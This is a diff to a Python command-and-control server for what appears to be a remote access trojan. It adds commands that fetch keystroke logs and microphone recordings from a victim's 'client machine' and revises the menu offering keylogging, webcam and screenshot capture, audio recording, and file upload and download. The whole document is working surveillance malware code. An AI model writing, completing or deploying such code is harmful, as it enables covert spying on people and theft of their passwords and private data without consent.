@@ -29,13 +29,20 @@ def handle_client(client_socket):
 			
 			print(output)
 
-			if  command.startswith(('download', 'webcam', 'screenshot')):
-				output = base64.b64decode(output.encode())
+			if  command.startswith(('download', 'webcam', 'screenshot', 'getkeylogger', 'getmicrecord')):
+				try:
+					output = base64.b64decode(output.encode())
+				except Exception :
+					continue
 				if command == 'screenshot':
 					filename = f"screenshot{int(time.time())}.png"
 				elif command == 'webcam':
 					filename = f"webcam{int(time.time())}.png"
 				elif command.startswith('mic'):
+					filename = f"microphone{int(time.time())}.wav"
+				elif command == 'getkeylogger':
+					filename = f"keylogg{int(time.time())}.txt"
+				elif command == 'getmicrecord':
 					filename = f"microphone{int(time.time())}.wav"
 				else:
 					filename = command[9:]
@@ -49,37 +56,9 @@ def handle_client(client_socket):
 					continue
 			#keylogg wela ymchi !
 			if command == 'mic':
-				print("\npress esq to stop microphone recording on client machine")
-				keyboard.wait("esc")
-				client_socket.send("stop".encode())
-				filename = f"microphone{int(time.time())}.wav"
-				output = client_socket.recv(1000000).decode()
-				output = base64.b64decode(output.encode())
-				try:
-					with open(filename, 'wb') as f:
-						f.write(output)
-					print(f"Audio file {filename} saved successfully.")
-					continue
-				except Exception as e:
-					print(f"[-] Failed to save audio file: {e}")
-					continue
+				continue
 			if command == 'keylogger':
-				#if messege == "Keylogging ...":
-				print("\nPress esq to stop keylogging on client machine")
-				keyboard.wait("esc")
-				client_socket.send("stop".encode())
-				filename = f"keylogg{int(time.time())}.txt"
-				output = client_socket.recv(1000000).decode()
-				output = base64.b64decode(output.encode())
-				try:
-					with open(filename, 'wb') as f:
-						f.write(output)
-					print(f"Keylog file {filename} saved successfully.")
-					continue
-				except Exception as e:
-					print(f"[-] Failed to save keylog file: {e}")
-					continue
-				
+				continue
 				
 		except Exception as e:
 			print(f"An error occurred: {e}")
@@ -104,13 +83,16 @@ def start_server():
 		print("--------------------------------------------------")
 		print("C2 Server is Running...")
 		print("enter any command to send to the client")
-		print("type 'keylogger' to start keylogger on client machine (type 'exit' to stop it)")
 		print("type 'upload <path on server> <path on client>' to upload file to client machine")
 		print("type 'download <path>' to download file from client machine")
 		print("type 'screenshot' to capture screenshot from client machine")
 		print("type 'webcam' to capture webcam image from client machine")
-		print("type 'mic <duration>' to record audio from client machine")
+		print("type 'keylogger' to start keylogger on client machine")
+		print("type 'getkeylogger' to get keystrokes logged from client machine")
+		print("type 'mic' to start recording audio from client machine")
+		print("type 'getmicrecord' to get audio recorded from client machine")
 		print("type 'exit' to terminate the connection")
+
 		#client_handler = threading.Thread(target=handle_client, args=(conn,))
 		#client_handler.start()
 		handle_client(conn)
